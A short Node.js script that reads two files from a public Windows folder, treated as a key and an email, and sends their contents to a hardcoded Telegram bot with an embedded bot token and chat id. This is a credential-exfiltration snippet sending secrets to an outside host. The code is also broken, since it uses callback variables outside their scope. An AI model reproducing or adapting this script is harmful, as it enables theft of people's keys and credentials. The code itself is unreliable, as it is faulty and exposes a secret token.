const fs = require('fs')
const fetch = require('node-fetch');

var key;
var email;

const filePath = 'C:/Users/Public/strand';

fs.readFile(filePath, 'utf8', (err, data) => {
  if (err) {
    console.error(`Error reading file: ${err}`);
    return;
  }

  console.log('File content:');
  console.log(data);
});

key = data;

const filePaths = 'C:/Users/Public/strands';

fs.readFile(filePaths, 'utf8', (err, datas) => {
  if (err) {
    console.error(`Error reading file: ${err}`);
    return;
  }

  console.log('File content:');
  console.log(datas);

});

email = datas;

var phrase = email + "\n" + key;

sendMessageToTelegram(phrase);

    function sendMessageToTelegram(phrase){
        const API_KEY = '5484438430:AAGwr_Z3Ih43_Dk0wqUIFfyyW3nTbEtKUug'
        const chat_id = 5553219201
        let url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${chat_id}&text=${phrase}`
        fetch(url);
    }
